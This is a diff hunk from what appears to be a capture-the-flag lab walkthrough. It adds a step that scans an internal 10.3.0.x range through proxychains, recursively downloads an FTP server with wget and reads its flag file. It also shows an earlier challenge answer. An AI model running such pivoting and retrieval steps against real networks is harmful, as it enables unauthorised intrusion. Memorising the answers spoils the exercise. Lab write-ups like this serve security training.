@@ -3299,3 +3299,7 @@ Terminal 2: proxychains ./scan.sh    (this will scan for the ports, across a ran
             cat flag.txt (answer is: substitution)
             
 (7.)
+Terminal 2: from the last question (6). scan for the FTP server on T3. 
+            proxychains ./scan.sh (start at 10.3.0 , start at 1 , end at 254 , 21-23 80 )
+            proxychains wget -r ftp://10.3.0.27
+            cat 10.3.0.27/flag.txt
